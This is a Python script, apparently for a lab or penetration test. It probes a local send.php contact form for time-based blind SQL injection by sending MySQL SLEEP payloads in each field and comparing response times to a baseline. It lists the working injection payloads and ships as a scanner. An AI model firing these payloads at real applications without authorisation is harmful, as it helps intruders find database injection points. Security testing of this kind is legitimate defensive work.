import requests
import time
import sys

# Configuration - use direct IP to avoid DNS issues
target_url = "http://127.0.0.1/send.php"
parameters = ['fullname', 'email', 'phone', 'subject', 'message']

# MySQL time-based sleep payloads
sleep_payloads = [
    "' OR SLEEP(5)-- ",
    "'; SLEEP(5);-- ",
    "') OR SLEEP(5);-- ",
    "' OR (SELECT SLEEP(5))--",
    "' UNION SELECT SLEEP(5)--",
    "'||(SELECT SLEEP(5))--",
]

# Valid data for baseline
valid_data = {
    'fullname': 'Test User',
    'email': 'test@example.com', 
    'phone': '555-0000',
    'subject': 'Test Subject',
    'message': 'Test message content'
}

def test_request(data, description):
    """Make request and measure time with error handling"""
    try:
        start = time.time()
        response = requests.post(
            target_url,
            data=data,
            allow_redirects=False,
            timeout=15,
            headers={'Content-Type': 'application/x-www-form-urlencoded'}
        )
        elapsed = time.time() - start
        return elapsed, response.status_code, True
    except Exception as e:
        elapsed = time.time() - start
        return elapsed, str(e), False

print("="*70)
print("BLIND SQL INJECTION - TIME-BASED DETECTION")
print("="*70)
print(f"Target: {target_url}")
print(f"Parameters: {parameters}")
print(f"Payloads to test: {len(sleep_payloads)}")
print()

# Baseline measurement
print("[*] Phase 1: Establishing baseline response time")
print("-"*70)

baseline_times = []
for i in range(3):
    elapsed, status, success = test_request(valid_data, f"baseline_{i}")
    baseline_times.append(elapsed)
    print(f"  Baseline {i+1}: {elapsed:.3f}s (Status: {status})")

avg_baseline = sum(baseline_times) / len(baseline_times)
threshold = avg_baseline + 4.0

print(f"\n[*] Baseline average: {avg_baseline:.3f}s")
print(f"[*] Vulnerability threshold: {threshold:.3f}s (baseline + 4s)")
print()

# Test each parameter
print("[*] Phase 2: Testing parameters with sleep payloads")
print("-"*70)

results = {}
vulnerable_params = []

for param in parameters:
    print(f"\n[Testing: {param}]")
    param_results = []
    
    for idx, payload in enumerate(sleep_payloads, 1):
        # Prepare test data
        test_data = valid_data.copy()
        test_data[param] = payload
        
        print(f"  Payload {idx}: {payload[:35]}...")
        elapsed, status, success = test_request(test_data, f"{param}_{idx}")
        
        delay = elapsed - avg_baseline
        param_results.append({
            'payload': payload,
            'time': elapsed,
            'delay': delay,
            'status': status
        })
        
        print(f"    Time: {elapsed:.3f}s | Delay: {delay:+.3f}s | Status: {status}")
        
        if delay >= 4.0:
            print(f"    >>> SIGNIFICANT DELAY DETECTED!")
    
    results[param] = param_results
    
    # Check if any payload caused delay
    max_delay = max(r['delay'] for r in param_results)
    if max_delay >= 4.0:
        vulnerable_params.append(param)

# Summary
print("\n" + "="*70)
print("FINAL RESULTS")
print("="*70)

if vulnerable_params:
    print("[!] VULNERABILITY CONFIRMED")
    print(f"[!] Parameters with time-based SQL injection: {vulnerable_params}")
    print()
    print("Detailed delays:")
    for param in vulnerable_params:
        print(f"\n  {param}:")
        for r in results[param]:
            if r['delay'] >= 4.0:
                print(f"    +{r['delay']:.3f}s - {r['payload'][:40]}")
else:
    print("[-] NO VULNERABILITY DETECTED")
    print("[-] No significant delays observed across all parameters")
    print("[-] Application appears NOT vulnerable to time-based SQL injection")

print("="*70)

# Exit with appropriate code
sys.exit(1 if vulnerable_params else 0)
